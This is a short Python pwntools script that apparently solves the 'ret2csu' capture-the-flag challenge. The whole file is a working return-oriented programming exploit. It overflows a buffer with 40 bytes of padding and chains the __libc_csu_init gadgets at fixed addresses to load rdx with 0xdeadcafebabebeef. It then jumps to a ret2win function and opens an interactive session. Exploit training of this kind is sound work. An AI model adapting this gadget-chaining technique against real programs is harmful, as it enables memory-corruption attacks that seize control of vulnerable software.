#!/usr/bin/env python3

from pwn import *

pwn = process("./ret2csu")
#db.attach(pwn, '''
#reak main
#'')

#------------------- TOYS ------------------------#
gadget1 = p64(0x00400880) # mov rdx, r15
                          # mov rsi, r14
                          # mov edi, r13d
                          # call qword ptr [r12 + rbx * 0x8]
					 
gadget2 = p64(0x0040089a) # pop rbx
                          # pop rbp
                          # pop r12
                          # pop r13
                          # pop r14
                          # pop r15
                          # ret

junk = b'\x41' * 40
filler = p64(0x1)
null = b'\x00' * 8

ptr_to_fini = p64(0x00600e48)
ret2win = p64(0x004007b1)
rdx_val = p64(0xdeadcafebabebeef)
#------------------- TOYS ------------------------#

buf = junk
buf += gadget2
buf += null # rbx
buf += filler # rbp
buf += ptr_to_fini # r12
buf += filler # r13
buf += filler # r14
buf += rdx_val # r15

buf += gadget1

'''
INSTRUCTIONS WE RETURN TO IN LIBC_CSU_INIT
add rbx, 0x1
cmp rbp, rbx # rbp is set to 0x1 already from filler
add rsp, 0x8 # then we do 6 pops, so we need to add + 7 (fillers) + 1 (+8 total) ret2win
pop 
pop
pop
pop
pop
pop
ret
'''

buf += filler
buf += filler
buf += filler
buf += filler
buf += filler
buf += filler
buf += filler
buf += ret2win

pwn.sendline(buf)
pwn.interactive()
